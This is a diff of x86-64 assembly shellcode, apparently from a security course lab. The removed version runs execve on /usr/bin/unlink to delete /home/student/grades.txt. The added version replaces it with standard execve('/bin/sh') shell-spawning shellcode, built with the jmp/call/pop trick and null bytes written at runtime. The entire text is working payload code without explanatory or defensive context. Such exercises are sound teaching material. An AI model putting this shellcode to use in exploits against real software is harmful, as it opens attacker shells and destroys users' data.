@@ -1,9 +1,9 @@
 #include <sys/syscall.h>
 
-#define STRING	"/usr/bin/unlinkA/home/student/grades.txtA"
-#define STRLEN	41
+#define STRING	"/bin/sh"
+#define STRLEN	7
 #define ARGV	(STRLEN+1)
-#define ENVP	(ARGV+24)
+#define ENVP	(ARGV+8)
 
 .globl main
 	.type	main, @function
@@ -12,17 +12,12 @@
 	jmp	calladdr
 
  popladdr:
-    xorq	%rax,%rax		/* get a 64-bit zero value */
-	popq	%rcx    /* address of string */
-
-	movq	%rcx,(ARGV)(%rcx)	/* first arg */
-    leaq    (16)(%rcx),%rbx
-    movq    %rbx,(ARGV+8)(%rcx) /* second arg */
-    movq    %rax,(ARGV+16)(%rcx) /* NULL end */
-    movb	%al,(15)(%rcx)	/* null-terminate our string 1 */
-	movb	%al,(40)(%rcx)	/* null-terminate our string 2 */
+	popq	%rcx
+	movq	%rcx,(ARGV)(%rcx)	/* set up argv pointer to pathname */
+	xorq	%rax,%rax		/* get a 64-bit zero value */
+	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
 	movq	%rax,(ENVP)(%rcx)	/* set up null envp */
-    
+
 	movb	$SYS_execve,%al		/* set up the syscall number */
 	movq	%rcx,%rdi		/* syscall arg 1: string pathname */
 	leaq	ARGV(%rcx),%rsi		/* syscall arg 2: argv */
